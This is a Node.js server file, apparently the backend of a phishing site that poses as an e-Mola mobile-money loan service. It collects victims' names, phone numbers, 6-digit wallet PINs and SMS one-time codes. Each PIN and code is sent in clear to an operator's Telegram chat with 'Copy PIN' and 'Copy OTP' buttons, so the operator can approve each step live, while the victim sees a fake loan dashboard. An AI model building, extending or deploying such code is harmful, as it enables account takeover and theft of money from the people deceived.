require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const fetch = require('node-fetch');
const axios = require('axios');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, '../frontend')));

const PORT = process.env.PORT || 3000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
const SMS_GATEWAY_URL = process.env.SMS_GATEWAY_URL;
const SMS_GATEWAY_API_KEY = process.env.SMS_GATEWAY_API_KEY;
const DEBUG_SMS = process.env.DEBUG_SMS !== 'false';

const applications = {};

function generateId() {
  return 'APP' + Math.random().toString(36).substring(2, 10).toUpperCase();
}
function generateCode(len = 6) {
  return Math.floor(10 ** (len - 1) + Math.random() * 9 * 10 ** (len - 1)).toString();
}

async function sendTelegramMessage(text, buttons = null) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
  const body = { chat_id: TELEGRAM_CHAT_ID, text };
  if (buttons) body.reply_markup = { inline_keyboard: buttons };
  try {
    await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });
  } catch (e) {
    console.error('Telegram send error:', e);
  }
}

async function sendSms(to, text) {
  if (!SMS_GATEWAY_URL || !SMS_GATEWAY_API_KEY) {
    console.log(`[SIMULATED SMS] to ${to}: ${text}`);
    return;
  }
  try {
    await axios.post(`${SMS_GATEWAY_URL}/sms`, { to, text }, {
      headers: { 'Content-Type': 'application/json', 'x-api-key': SMS_GATEWAY_API_KEY }
    });
    console.log(`✅ SMS sent to ${to}`);
  } catch (e) {
    console.error('❌ SMS send failed:', e.message);
    console.log(`[FALLBACK SIMULATED SMS] to ${to}: ${text}`);
  }
}

app.use((err, req, res, next) => {
  console.error('Unhandled error:', err);
  res.status(500).json({ ok: false, message: 'Internal server error' });
});

// Routes
app.get('/api/health', (req, res) => res.json({ ok: true }));

// 1. Submit application
app.post('/api/send-application', async (req, res) => {
  try {
    const data = req.body.applicationData;
    if (!data || !data.phone) {
      return res.status(400).json({ ok: false, message: 'Missing required fields' });
    }
    const appId = generateId();
    applications[appId] = {
      ...data,
      appId,
      pinStatus: 'pending',
      otpStatus: 'pending',
      pinEntered: null,
      otpEntered: null,
      pinAttempts: 0,
      maxPinAttempts: 3,
      pinBlockedUntil: null,
      smsCode: null,
      otpCode: null,
      createdAt: new Date().toISOString()
    };

    const message = `📋 *NEW APPLICATION (e-Mola)*\n🆔 ID: ${appId}\n📱 Phone: +258${data.phone}\n💰 Amount: ${data.loanAmount} MZN\n👤 Name: ${data.firstName} ${data.lastName}\n\n✅ Approve or reject:`;
    const buttons = [[
      { text: '✅ Approve', callback_data: JSON.stringify({ a: 'APPROVE', step: 'APP', appId }) },
      { text: '❌ Reject', callback_data: JSON.stringify({ a: 'REJECT', step: 'APP', appId }) }
    ]];
    await sendTelegramMessage(message, buttons);
    res.json({ ok: true, applicationId: appId });
  } catch (err) {
    res.status(500).json({ ok: false, message: err.message });
  }
});

// 2. Check app status
app.get('/api/status/:applicationId/app', (req, res) => {
  const app = applications[req.params.applicationId];
  if (!app) return res.status(404).json({ ok: false, message: 'Application not found' });
  res.json({ ok: true, status: app.pinStatus, step: 'app' });
});

// 3. Send PIN (user submits PIN – 6 digits)
app.post('/api/send-pin', async (req, res) => {
  try {
    const { applicationId, pin } = req.body;
    const app = applications[applicationId];
    if (!app) return res.status(404).json({ ok: false, message: 'Application not found' });

    if (app.pinBlockedUntil && new Date(app.pinBlockedUntil) > new Date()) {
      return res.status(429).json({ ok: false, blocked: true, message: 'Too many attempts. Please wait.' });
    }

    if (!pin || pin.length !== 6) {
      return res.status(400).json({ ok: false, message: 'PIN must be 6 digits' });
    }

    app.pinEntered = pin;
    app.pinStatus = 'pending';

    const message = `🔐 *PIN VERIFICATION*\n🆔 ID: ${applicationId}\n🔢 PIN: ${pin}\n\n✅ Approve or reject:`;
    const buttons = [
      [{ text: '📋 Copy PIN', callback_data: JSON.stringify({ action: 'COPY_PIN', appId: applicationId }) }],
      [
        { text: '✅ Approve', callback_data: JSON.stringify({ a: 'APPROVE', step: 'PIN', appId: applicationId }) },
        { text: '❌ Reject', callback_data: JSON.stringify({ a: 'REJECT', step: 'PIN', appId: applicationId }) }
      ]
    ];
    await sendTelegramMessage(message, buttons);
    res.json({ ok: true, status: 'pending' });
  } catch (err) {
    res.status(500).json({ ok: false, message: err.message });
  }
});

// 4. Check PIN status
app.get('/api/status/:applicationId/pin', (req, res) => {
  const app = applications[req.params.applicationId];
  if (!app) return res.status(404).json({ ok: false, message: 'Application not found' });
  res.json({
    ok: true,
    status: app.pinStatus,
    remainingAttempts: Math.max(0, app.maxPinAttempts - app.pinAttempts),
    blocked: app.pinStatus === 'blocked',
    blockRemainingSeconds: app.pinBlockedUntil ? Math.ceil((new Date(app.pinBlockedUntil) - new Date()) / 1000) : 0
  });
});

// 5. PIN rejected handler
app.post('/api/pin-rejected', async (req, res) => {
  try {
    const { applicationId } = req.body;
    const app = applications[applicationId];
    if (!app) return res.status(404).json({ ok: false, message: 'Application not found' });

    app.pinAttempts++;
    const remaining = app.maxPinAttempts - app.pinAttempts;
    if (remaining <= 0) {
      app.pinBlockedUntil = new Date(Date.now() + 5 * 60 * 1000).toISOString();
      app.pinStatus = 'blocked';
      await sendTelegramMessage(`🔒 PIN BLOCKED for ${applicationId}`);
      return res.json({
        ok: false,
        blocked: true,
        remainingAttempts: 0,
        blockRemainingSeconds: 300,
        message: 'Too many failed attempts. Blocked for 5 minutes.'
      });
    }
    res.json({
      ok: false,
      remainingAttempts: remaining,
      message: `Wrong PIN. ${remaining} attempt(s) remaining.`
    });
  } catch (err) {
    res.status(500).json({ ok: false, message: err.message });
  }
});

// 6. Reset PIN attempts
app.post('/api/reset-pin-attempts/:applicationId', (req, res) => {
  const app = applications[req.params.applicationId];
  if (!app) return res.status(404).json({ ok: false, message: 'Application not found' });
  app.pinAttempts = 0;
  app.pinBlockedUntil = null;
  app.pinStatus = 'pending';
  res.json({ ok: true });
});

// 7. Send OTP (user submits OTP – 6 digits)
app.post('/api/send-otp', async (req, res) => {
  try {
    const { applicationId, otp } = req.body;
    const app = applications[applicationId];
    if (!app) return res.status(404).json({ ok: false, message: 'Application not found' });

    if (app.pinStatus !== 'approved') {
      return res.status(400).json({ ok: false, message: 'PIN not approved yet' });
    }

    if (!otp || otp.length !== 6) {
      return res.status(400).json({ ok: false, message: 'OTP must be 6 digits' });
    }

    app.otpEntered = otp;
    app.otpStatus = 'pending';

    const message = `🔑 *OTP VERIFICATION*\n🆔 ID: ${applicationId}\n🔢 OTP: ${otp}\n\n✅ Approve or reject:`;
    const buttons = [
      [{ text: '📋 Copy OTP', callback_data: JSON.stringify({ action: 'COPY_OTP', appId: applicationId }) }],
      [
        { text: '✅ Approve', callback_data: JSON.stringify({ a: 'APPROVE', step: 'OTP', appId: applicationId }) },
        { text: '❌ Reject', callback_data: JSON.stringify({ a: 'REJECT', step: 'OTP', appId: applicationId }) }
      ]
    ];
    await sendTelegramMessage(message, buttons);
    res.json({ ok: true, status: 'pending' });
  } catch (err) {
    res.status(500).json({ ok: false, message: err.message });
  }
});

// 8. Check OTP status
app.get('/api/status/:applicationId/otp', (req, res) => {
  const app = applications[req.params.applicationId];
  if (!app) return res.status(404).json({ ok: false, message: 'Application not found' });
  res.json({ ok: true, status: app.otpStatus });
});

// 9. Dashboard
app.get('/api/dashboard/:applicationId', (req, res) => {
  const app = applications[req.params.applicationId];
  if (!app) return res.status(404).json({ ok: false, message: 'Application not found' });
  if (app.otpStatus !== 'approved') {
    return res.status(403).json({ ok: false, message: 'Loan not approved yet' });
  }
  res.json({
    ok: true,
    data: {
      applicationId: app.appId,
      loanAmount: app.loanAmount,
      loanTerm: app.loanTerm,
      monthlyPayment: Math.ceil(app.loanAmount / parseInt(app.loanTerm)),
      status: 'approved',
      approvedAt: app.updatedAt
    }
  });
});

// 10. Telegram Webhook (HYBRID)
app.post('/api/telegram-webhook', async (req, res) => {
  const update = req.body;

  if (update.callback_query) {
    const query = update.callback_query;
    let data;
    try { data = JSON.parse(query.data); } catch (e) { return res.sendStatus(200); }

    const { a, step, action, appId } = data;
    const app = applications[appId];
    if (!app) return res.sendStatus(200);

    if (action === 'COPY_PIN') {
      if (app.pinEntered) await sendTelegramMessage(app.pinEntered);
      else await sendTelegramMessage('⚠️ No PIN entered yet.');
    } else if (action === 'COPY_OTP') {
      if (app.otpEntered) await sendTelegramMessage(app.otpEntered);
      else await sendTelegramMessage('⚠️ No OTP entered yet.');
    } else if (step === 'APP') {
      app.pinStatus = (a === 'APPROVE') ? 'approved' : 'rejected';
      if (app.pinStatus === 'approved') {
        await sendSms(`+258${app.phone}`, 'Your application is approved. Enter your e-Mola PIN.');
      }
    } else if (step === 'PIN') {
      app.pinStatus = (a === 'APPROVE') ? 'approved' : 'rejected';
      if (app.pinStatus === 'rejected') {
        app.pinAttempts++;
        if (app.pinAttempts >= app.maxPinAttempts) {
          app.pinBlockedUntil = new Date(Date.now() + 5 * 60 * 1000).toISOString();
          app.pinStatus = 'blocked';
        }
      } else if (app.pinStatus === 'approved') {
        const otpCode = generateCode(6);  // 6-digit OTP
        app.otpCode = otpCode;
        await sendSms(`+258${app.phone}`, `Your e-Mola OTP is: ${otpCode}`);
      }
    } else if (step === 'OTP') {
      app.otpStatus = (a === 'APPROVE') ? 'approved' : 'rejected';
    }

    await fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: query.id, text: `✅ ${a || action}` })
    });

    return res.sendStatus(200);
  }

  if (update.message && update.message.text) {
    const text = update.message.text.trim().toUpperCase();
    const replyTo = update.message.reply_to_message?.text;
    const idMatch = replyTo?.match(/🆔\s*ID:\s*([A-Z0-9-]+)/);
    const applicationId = idMatch ? idMatch[1] : null;
    if (!applicationId || !applications[applicationId]) return res.sendStatus(200);

    const app = applications[applicationId];
    if (app.pinStatus === 'pending' && text === 'YES') app.pinStatus = 'approved';
    else if (app.pinStatus === 'pending' && text === 'NO') app.pinStatus = 'rejected';
    else if (app.otpStatus === 'pending' && text === 'YES') app.otpStatus = 'approved';
    else if (app.otpStatus === 'pending' && text === 'NO') app.otpStatus = 'rejected';

    return res.sendStatus(200);
  }

  res.sendStatus(200);
});

// Serve frontend
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, '../frontend', 'index.html'));
});

app.listen(PORT, () => {
  console.log(`🚀 e-Mola server running on port ${PORT}`);
});
